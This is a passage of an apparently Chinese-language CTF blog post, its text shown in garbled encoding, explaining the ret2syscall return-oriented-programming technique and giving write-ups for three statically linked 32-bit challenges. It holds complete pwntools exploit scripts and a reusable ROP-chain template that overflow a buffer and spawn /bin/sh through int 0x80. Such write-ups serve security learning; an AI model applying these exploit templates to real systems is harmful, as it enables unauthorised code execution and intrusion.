å®Œäº†ï¼Œå‰©ä¸‹çš„åªè¦æ‰¾äº›gadgetç‰‡æ®µè¿›è¡Œret2syscallå³å¯ã€‚å¦‚æœæ²¡æœ‰readå‡½æ•°çš„è¯ï¼Œç†è®ºæ¥è¯´æˆ‘ä»¬æ˜¯å¯ä»¥ç³»ç»Ÿè°ƒç”¨readå‡½æ•°çš„ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå½“ç”¨int 0x80æ¥ç³»ç»Ÿè°ƒç”¨readå‡½æ•°ä¹‹åï¼Œint 0x80æŒ‡ä»¤çš„åé¢ä¸æ˜¯retæŒ‡ä»¤ï¼Œæ²¡æœ‰åŠæ³•å†å»è¡”æ¥åé¢çš„gadgetäº†ã€‚ä¸è¿‡ç›®å‰è¿˜æ²¡æœ‰é‡è§è¿‡ç³»ç»Ÿè°ƒç”¨readå‡½æ•°å†ret2syscallçš„é¢˜ç›®ã€‚</p><p>å½“ä½¿ç”¨è¿™ä¸¤ç§æ–¹æ³•å…¶ä¸­çš„ä¸€ç§ä¹‹åï¼Œä¼ å‚å®Œæ¯•ï¼Œå¦‚æ­¤å‰©ä¸‹çš„å°±æ˜¯å»æœå¯»æˆ‘ä»¬éœ€è¦çš„gadgetç‰‡æ®µï¼Œæœ€åç³»ç»Ÿè°ƒç”¨å³å¯ã€‚</p><h2 id="æ€ä¹ˆæœå¯»gadgetç‰‡æ®µï¼Ÿ"><a href="#æ€ä¹ˆæœå¯»gadgetç‰‡æ®µï¼Ÿ" class="headerlink" title="æ€ä¹ˆæœå¯»gadgetç‰‡æ®µï¼Ÿ"></a>æ€ä¹ˆæœå¯»gadgetç‰‡æ®µï¼Ÿ</h2><p>æˆ‘ä»¬éœ€è¦å€ŸåŠ©ROPgadgetå·¥å…·ï¼Œè¿™ä¸ªéœ€è¦è‡ªè¡Œå®‰è£…ï¼Œå®‰è£…å®Œæˆåã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬è¦æœç´¢int 0x80æŒ‡ä»¤çš„ç‰‡æ®µè¾“å…¥ROPgadget â€“binary | grep â€˜int 0x80â€™å³å¯ï¼Œå¦‚æœè¦æœç´¢pop eax ; retæŒ‡ä»¤ç‰‡æ®µï¼ŒåŒç†è¾“å…¥ROPgadget â€“binary | grep â€˜pop eax ; retâ€™å³å¯</p><p><img src="/../img/2706180-20220127203659117-356770839.png"></p><p><img src="/../img/2706180-20220127203712667-1709918883.png"></p><p>å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”æŒ‡ä»¤çš„åœ°å€äº†ã€‚</p><p>æœ€åè¦ä»‹ç»ä¸€ä¸‹ret2syscallä¸­æ€ä¹ˆè¿›è¡Œä¼ å‚ã€‚é™¤å»&#x2F;bin&#x2F;shè¿™å‚æ•°çš„ä¼ å‚æ–¹å¼å¤–ï¼ˆè¯¥ä¼ å‚æ–¹å¼ä¸Šé¢å·²ç»ä»‹ç»è¿‡äº†ï¼‰ï¼Œå‰©ä¸‹çš„ä¼ å‚æ–¹å¼å¾ˆå•ä¸€ï¼Œå…ˆå»æ‰¾åˆ°è¦ä¼ å‚èµ‹å€¼çš„å¯„å­˜å™¨ï¼Œç„¶åå»ç”¨ROPgadgetæœç´¢pop å¯„å­˜å™¨ï¼›retæŒ‡ä»¤ç‰‡æ®µçš„åœ°å€å³å¯ã€‚</p><p>ä»¥eaxå­˜å…¥11æ¥ä¸¾ä¾‹</p><p>æ„é€ <code>payloadä½payload=p32(pop_eax_addr)+p32(11)</code>è¿™æ ·èƒ½è¾¾åˆ°æ•ˆæœçš„åŸå› æ˜¯æ‰§è¡Œpop eaxçš„æ—¶å€™ï¼Œæ ˆé¡¶å°±æ˜¯11ï¼Œæ­¤æ—¶å°±æ˜¯æŠŠæ ˆé¡¶çš„11ç»™å¼¹è¿›eaxé‡Œé¢ï¼Œå³å®Œæˆäº†ä¼ å‚ã€‚</p><p>æŒæ¡äº†ä¸Šè¿°è¿™äº›ä¹‹åï¼Œå°±å¯ä»¥å»å®Œæˆret2syscallç›¸å…³çš„é¢˜ç›®äº†ã€‚</p><h1 id="ä¸¤é“ä¾‹é¢˜"><a href="#ä¸¤é“ä¾‹é¢˜" class="headerlink" title="ä¸¤é“ä¾‹é¢˜"></a>ä¸¤é“ä¾‹é¢˜</h1><p>æœ€åæ‹¿ä¸¤é“ä¾‹é¢˜æ¥æ¼”ç¤ºä¸€ä¸‹ã€‚</p><p>åˆ†åˆ«æ˜¯BUUCTFä¸Šçš„inndy_ropå’ŒBUUCTFçš„cmcc_simpleropï¼Œè¿™ä¸¤é“é¢˜åˆ†åˆ«è€ƒå¯Ÿäº†ä¸¤ç§å†™å…¥å‚æ•°çš„æ–¹æ³•ã€‚</p><p>é¢˜ç›®é“¾æ¥</p><p>inndy_rop         <a href="https://buuoj.cn/challenges#inndy_rop">BUUCTFåœ¨çº¿è¯„æµ‹ (buuoj.cn)</a></p><p>cmcc_simplerop     <a href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTFåœ¨çº¿è¯„æµ‹ (buuoj.cn)</a></p><p>è¿™é‡Œæˆ‘åˆ†åˆ«ç»™å‡ºwp</p><hr><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p><img src="/../img/2706180-20220127203727516-678751435.png"></p><p>æ­¤æ—¶çœ‹ä¿æŠ¤è¿˜æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯ç”¨IDAå°±å‘ç°ä¸å¯¹åŠ²äº†<br><img src="/../img/2706180-20220127203739873-417953413.png"></p><p><img src="/../img/2706180-20220127203751365-839458355.png"></p><p>ä¸Šé¢çš„é‚£ä¸ªå°±æ˜¯ä¸»å‡½æ•°</p><p>å…ˆæ˜¯å‘ç°å·¦ä¾§çš„å‡½æ•°è¡¨æœ‰å¾ˆå¤šå¾ˆå¤šçš„å‡½æ•°ï¼Œè¯´æ˜è¿™ä¸ªç¨‹åºæ˜¯é™æ€é“¾æ¥ï¼Œé™æ€é“¾æ¥å°±æ„å‘³ç€æ²¡æ³•å»ret2libcäº†ï¼Œå› ä¸ºret2libcæœ¬æ¥å°±æ˜¯å»ç”¨åŠ¨æ€åº“é‡Œé¢çš„ç³»ç»Ÿå‡½æ•°ï¼Œå¯æ˜¯ç°åœ¨æ²¡æœ‰åŠ¨æ€åº“äº†ï¼Œå› æ­¤å°±è¦ç”¨ret2syscall</p><p>æ­¤æ—¶ç”¨åˆ°ä¸Šé¢ï¼Œæˆ‘æåˆ°çš„ç¬¬ä¸€ç§æ–¹æ³•å°†&#x2F;bin&#x2F;shå†™å…¥bssæ®µ</p><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯æœ[ecx]æŒ‡ä»¤åœ°å€çš„æ—¶å€™ è¦è¿™ä¹ˆæœï¼Œè¦ç”¨åæ–œæ ç”¨æ¥è½¬ä¹‰<br><img src="/../img/2706180-20220127203803936-1340958560.png"></p><p><img src="/../img/2706180-20220127203818420-1093356739.png"></p><p>æ€è·¯å°±æ˜¯ç³»ç»Ÿè°ƒç”¨execveï¼Œç„¶åæŠŠå‚æ•°&#x2F;bin&#x2F;shå†™å…¥bssæ®µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25149</span>)</span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBB81</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#åˆ©ç”¨ecxå½“ä¸€ä¸ªåª’ä»‹ï¼Œä»¥æ­¤æ¥è®©/bin/shå†™åˆ°bssæ®µï¼Œæœ€åçš„00ç”¨æ¥æˆªæ–­ï¼Œä¸ç„¶execveæ¥æ”¶å‚æ•°çš„æ—¶å€™ï¼Œå®ƒä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å‚æ•°æˆªæ­¢ã€‚</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#æŠŠebxå­˜å…¥å‚æ•°/bin/shçš„åœ°å€</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="/../img/2706180-20220127203856048-493266564.png"></p><p><img src="/../img/2706180-20220127203918982-250461252.png"></p><p>æ²¡æœ‰canaryï¼Œå¹¶ä¸”è¿™é‡Œå­˜åœ¨æº¢å‡ºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ropã€‚</p><p><img src="/../img/2706180-20220127204005942-290500809.png"></p><p>ä½†æ˜¯ç´§æ¥ç€ï¼Œå°±å‘ç°å·¦è¾¹æ˜¯è¿™ä¹ˆä¸€å¨å‡½æ•°ï¼Œ<strong>å°±æ„å‘³ç€è¿™é“é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œé™æ€é“¾æ¥å°±æ„å‘³ç€æˆ‘ä»¬æ²¡åŠæ³•ret2libcï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ²¡åŠæ³•ret2textï¼Œå¼€äº†NXä¿æŠ¤ï¼Œæ²¡åŠæ³•ret2shellcodeã€‚</strong></p><p><strong>å› æ­¤åªèƒ½æ˜¯ret2syscalläº†</strong>ã€‚</p><p>æˆ‘ä»¬ç°åœ¨éœ€è¦å»æ‰¾gadgetç‰‡æ®µã€‚</p><p><strong>å› ä¸ºæˆ‘ä»¬éœ€è¦è®¾ç½®eax,ebx,ecx,edxè¿™å››ä¸ªå¯„å­˜å™¨çš„å‚æ•°ï¼Œå› æ­¤éœ€è¦å»åˆ†åˆ«æ‰¾popè¿™å››ä¸ªå¯„å­˜å™¨çš„æŒ‡ä»¤ã€‚</strong></p><p><img src="/../img/2706180-20220127204033314-1369511097.png"></p><p>è¿™é‡Œç›´æ¥å°±å‘ç°äº†è¿ç»­popä¸‰ä¸ªå¯„å­˜å™¨çš„æŒ‡ä»¤ï¼Œæ¯”è¾ƒniceã€‚</p><p><img src="/../img/2706180-20220127204105424-1865663775.png"></p><p>å¯„å­˜å™¨æ‰¾å®Œäº†ï¼Œç°åœ¨æœ€å¤§çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆæŠŠ&#x2F;bin&#x2F;shç»™ä¼ è¿›å»ï¼Ÿ</p><p>è¿™é“é¢˜æ²¡æœ‰ç±»ä¼¼äºpop [ecx]è¿™ç±»æŒ‡ä»¤ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½å¦è¾Ÿè¹Šå¾„ã€‚</p><p><strong>å› ä¸ºå­˜åœ¨readå‡½æ•°(å¦‚æœæ²¡æœ‰readå‡½æ•°çš„è¯ï¼Œé‚£å°±ç³»ç»Ÿè°ƒç”¨ï¼Œä¸è¿‡æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œæ²¡æˆåŠŸï¼Œä½†åŸç†ä¸Šæ˜¯å¯è¡Œçš„)<strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆæŠŠreadçš„åœ°å€æ”¾åˆ°è¿”å›åœ°å€ï¼Œå†æ‰§è¡Œä¸€æ¬¡readï¼Œå°†å‚æ•°å†™å…¥æˆ‘ä»¬æŒ‡å®šçš„bssæ®µåœ°å€ï¼Œï¼ˆ</strong>ä¸ºä»€ä¹ˆè¦å†™å…¥bssæ®µï¼Œæ˜¯å› ä¸ºæ²¡å¼€pieçš„æƒ…å†µä¸‹ï¼Œbssæ®µåœ°å€æ˜¯ä¸å˜çš„ï¼Œå¹¶ä¸”è¿™é“é¢˜çš„bssæ®µæ˜¯å¯å†™ï¼Œè¿™æ ·æˆ‘ä»¬å†™å…¥å‚æ•°ä¹‹åï¼Œç›´æ¥å†æ‹¿å†™å…¥çš„é‚£ä¸ªbssåœ°å€å½“åšebxçš„å‚æ•°å³å¯ï¼Œå¦‚æœæ˜¯å†™å…¥æ ˆä¸­çš„è¯ï¼Œè¿˜éœ€è¦æ³„éœ²æ ˆä¸­åœ°å€</strong>ï¼‰</p><p> å¹¶ä¸”å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬<font color=red><strong>ä¹‹åä½¿ç”¨pop eax+p32(0xb)è¿™ç§æŒ‡ä»¤çš„å‰ææ˜¯æ­¤æ—¶æ ˆé¡¶è¦æ˜¯0xbæ‰å¯ä»¥ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æ‰§è¡Œreadä¹‹åï¼Œå®ƒçš„ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯åœ¨æ ˆé¡¶çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦popä¸‰æ¬¡ï¼ŒæŠŠreadçš„å‚æ•°å…ˆç»™å¼¹å‡ºæ¥ï¼Œè¿™æ ·æ‰èƒ½é¡ºç†ä¼ ä¹‹åçš„å‚æ•°</strong></font>ã€‚</p><p> <strong>æœ€åè¦æ³¨æ„çš„ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œè¿™é“é¢˜ç”¨IDAçœ‹ï¼Œè·ç¦»è¿”å›åœ°å€æ˜¯0x18,ä½†æ˜¯ç”¨gdbè°ƒè¯•ä¸€ä¸‹å‘ç°ï¼Œå®ƒè·ç¦»è¿”å›åœ°å€å®é™…ä¸Šæ˜¯0x20ã€‚</strong></p><p> æœ€åå°±æ˜¯expäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27707</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bae06</span></span><br><span class="line">pop_ebx=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806e851</span></span><br><span class="line">pop_edx=<span class="number">0x0806e82a</span></span><br><span class="line">int_0x80=<span class="number">0x080493e1</span></span><br><span class="line">bss_addr=<span class="number">0x080EAFF0</span></span><br><span class="line">read_addr=<span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+p32(read_addr)+p32(pop_edx_ecx_ebx)<span class="comment">#è¿™ä¸‰ä¸ªpopå¤„äºreadå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿ç»­popä¸‰æ¬¡ï¼ŒæŠŠæ ˆé¡¶çš„å†…å®¹å¼¹å‡ºæ¥</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)<span class="comment">#readå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">11</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)<span class="comment">#å¼¹ç»™eaxçš„å†…å®¹æ˜¯11ï¼Œå› ä¸º11æ˜¯32ä½ç¨‹åºexecveçš„ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#è¿™é‡Œä¸€å®šè¦è¾“å…¥è¿™ä¸ª\x00å»æˆªæ–­</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>##picoctf_2018_can_you_gets_me</p><p><img src="/../img/2706180-20220303194850099-1407586466.png"></p><p><img src="/../img/2706180-20220303194913108-59758844.png"></p><p>å‘ç°æ˜¯é™æ€é“¾æ¥ï¼Œä¹‹å‰é™æ€é“¾æ¥å°±æ˜¯ç›´æ¥å»ç”¨ropgadgetæœäº†ropchainï¼Œç„¶åæˆ‘è¿™é“é¢˜ç›´æ¥æœäº†ä¸€ä¸‹ã€‚<br>ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æœï¼ˆaæ˜¯æ–‡ä»¶åï¼‰<br><img src="/../img/2706180-20220303195629484-228134511.png"><br>  <img src="/../img/2706180-20220303194931739-320603106.png"></p><p> <img src="/../img/2706180-20220303194955331-2123755447.png"><br>å‘ç°æ²¡æœ‰canaryï¼Œå¹¶ä¸”æœ‰æº¢å‡º<br>é‚£å°±æ²¡å°‘å¥½è¯´çš„äº†ï¼Œçœ‹ä¸€ä¸‹æº¢å‡ºåç§»</p><p><img src="/../img/2706180-20220303194941901-2106523077.png"></p><p>å‘ç°æº¢å‡ºåç§»ä¸º28ï¼Œç„¶åç›´æ¥æ‰“å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  <span class="comment">#è¿™é‡Œå¿…é¡»è¦å¼•å…¥è¿™ä¸ªåŒ…ï¼Œä¸ç„¶æ˜¯æ‰“ä¸é€šçš„</span></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29254</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./a&#x27;)</span></span><br><span class="line">offset=<span class="number">28</span></span><br><span class="line">p=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯å®šæ­»çš„æ¨¡æ¿ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><p>å¦‚æœæ‰‹å†™çš„è¯ä¹Ÿå¯ä»¥ï¼ŒåŸç†çš„è¯ä¸Šé¢è§£é‡Šè¿‡äº†ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥å½“åšæ¨¡æ¿æ¥ç”¨ï¼Œéœ€è¦ä¿®æ”¹çš„å‚æ•°ï¼Œæˆ‘åé¢åŠ äº†ä¸‰ä¸ª*ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#d=remote(&#x27;node4.buuoj.cn&#x27;,25149)#***</span></span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806cc25</span> <span class="comment">#*** è¿™äº›ç‰‡æ®µçš„è¯ï¼Œç›´æ¥ç”¨Ropgadgetæœå°±å¯ä»¥äº†</span></span><br><span class="line">bss_addr=<span class="number">0x080e9000</span>      <span class="comment">#***è¿™ä¸ªç”¨vmmapçœ‹ä¸€ä¸‹å“ªé‡Œæ˜¯å¯å†™çš„ï¼Œç„¶åæ”¾ä¸Šè¿™æ®µå¯å†™çš„åœ°å€å°±è¡Œäº†</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b81c6</span>  <span class="comment">#***</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span>  <span class="comment">#***</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de955</span>  <span class="comment">#***</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806f02a</span>  <span class="comment">#***</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ea</span><span class="comment">#*** è¿™ä¸ªåœ°æ–¹ç”¨è¿™ä¸ªæŒ‡ä»¤æ‰¾</span></span><br><span class="line"><span class="comment"># ROPgadget --binary  a | grep &#x27;pop dword ptr \[ecx\]&#x27; è¿™é‡Œä¸ä¸€å®šè¦ecxçš„ï¼Œåˆ«çš„å¯„å­˜å™¨ä¹Ÿå¯ä»¥</span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">28</span>*<span class="string">&#x27;a&#x27;</span> <span class="comment">#***</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#åˆ©ç”¨ecxå½“ä¸€ä¸ªåª’ä»‹ï¼Œä»¥æ­¤æ¥è®©/bin/shå†™åˆ°bssæ®µï¼Œæœ€åçš„00ç”¨æ¥æˆªæ–­ï¼Œä¸ç„¶execveæ¥æ”¶å‚æ•°çš„æ—¶å€™ï¼Œå®ƒä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å‚æ•°æˆªæ­¢ã€‚</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#æŠŠebxå­˜å…¥å‚æ•°/bin/shçš„åœ°å€</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>patchup--å‘½ä»¤è¡Œå°å·¥å…·</title>
      <link href="/posts/853f1673.html"/>
      <url>/posts/853f1673.html</url>
      
